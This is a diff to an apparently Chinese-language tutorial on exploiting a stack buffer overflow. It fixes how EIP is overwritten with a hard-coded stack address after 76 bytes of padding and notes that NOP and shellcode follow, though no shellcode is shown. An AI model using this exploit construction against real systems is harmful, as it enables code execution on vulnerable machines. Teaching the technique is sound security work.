@@ -124,9 +124,13 @@ import struct
 
 pad='a'\*76
 
-3\)接下来是漏洞触发 覆盖eip的地方，把eip地址覆盖成shellcode的入口地址，也可以是下一条要执行的指令的地址。原始eip的地址是0xbffffcbc，下一条指令的地址是0xbffffcbc
+3\)接下来是漏洞触发 覆盖eip的地方，把eip地址覆盖成shellcode的入口地址，也可以是下一条要执行的指令的地址。原始eip的地址是0xbffffcbc，下一条指令的地址是0xbffffcbc+4= 0xbffffcc0
 
-EIP = struct.pack\("I",
+EIP = struct.pack\("I", 0xbffffcc0\)
+
+紧跟着的是NOP 和 shellcode
+
+shellcode可以采用
 
 Ref：
 
